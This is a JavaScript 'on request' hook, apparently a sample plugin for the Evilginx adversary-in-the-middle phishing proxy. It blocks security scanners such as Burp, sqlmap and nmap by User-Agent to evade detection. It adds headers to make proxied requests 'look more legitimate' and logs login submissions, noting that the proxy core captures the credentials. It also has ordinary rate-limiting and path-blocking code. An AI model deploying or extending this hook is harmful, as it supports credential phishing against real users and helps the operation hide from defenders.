/**
 * On Request Hook
 * 
 * This hook is executed for every incoming request before it's proxied to the target.
 * You can modify headers, block requests, or log information.
 * 
 * Author: billion_laughs
 * Version: 1.0.0
 * 
 * @param {Object} req - Request object
 * @param {string} req.method - HTTP method (GET, POST, etc.)
 * @param {string} req.url - Full URL
 * @param {string} req.path - URL path
 * @param {Object} req.headers - Request headers
 * @param {Object} req.query - Query parameters
 * @param {string} req.body - Request body (for POST requests)
 * @param {string} req.ip - Client IP address
 * @returns {Object} Modified request object or {block: true} to block
 */

function onRequest(req) {
  // Log all requests (for debugging)
  console.log('[OnRequest]', req.method, req.path, 'from', req.ip);

  // Example 1: Block known security scanners
  const blockedUserAgents = [
    'Burp',
    'ZAP',
    'sqlmap',
    'nikto',
    'nmap',
    'masscan',
  ];

  if (req.headers['User-Agent']) {
    for (let i = 0; i < blockedUserAgents.length; i++) {
      if (req.headers['User-Agent'].toLowerCase().includes(blockedUserAgents[i].toLowerCase())) {
        console.log('[OnRequest] Blocked security scanner:', req.headers['User-Agent']);
        return {
          block: true,
          status: 403,
          body: 'Forbidden',
        };
      }
    }
  }

  // Example 2: Add custom headers to make requests look more legitimate
  req.headers['X-Forwarded-Proto'] = 'https';
  req.headers['X-Real-IP'] = req.ip;

  // Example 3: Modify specific requests
  if (req.path.includes('/api/')) {
    // Add API version header
    req.headers['X-API-Version'] = '2.0';
  }

  // Example 4: Log credential submissions
  if (req.method === 'POST' && req.path.includes('login')) {
    console.log('[OnRequest] Login attempt from', req.ip);
    // Note: Actual credentials are captured by Evilginx core
  }

  // Example 5: Block requests to certain paths
  const blockedPaths = [
    '/admin',
    '/debug',
    '/test',
  ];

  for (let i = 0; i < blockedPaths.length; i++) {
    if (req.path.startsWith(blockedPaths[i])) {
      console.log('[OnRequest] Blocked access to:', req.path);
      return {
        block: true,
        status: 404,
        body: 'Not Found',
      };
    }
  }

  // Example 6: Rate limiting (simple implementation)
  if (!global.requestCounts) {
    global.requestCounts = {};
  }

  if (!global.requestCounts[req.ip]) {
    global.requestCounts[req.ip] = {count: 0, lastReset: Date.now()};
  }

  // Reset counter every minute
  if (Date.now() - global.requestCounts[req.ip].lastReset > 60000) {
    global.requestCounts[req.ip] = {count: 0, lastReset: Date.now()};
  }

  global.requestCounts[req.ip].count++;

  // Block if more than 100 requests per minute
  if (global.requestCounts[req.ip].count > 100) {
    console.log('[OnRequest] Rate limit exceeded for', req.ip);
    return {
      block: true,
      status: 429,
      body: 'Too Many Requests',
    };
  }

  // Example 7: Modify query parameters
  if (req.query['debug']) {
    // Remove debug parameter
    delete req.query['debug'];
  }

  // Return modified request
  return req;
}
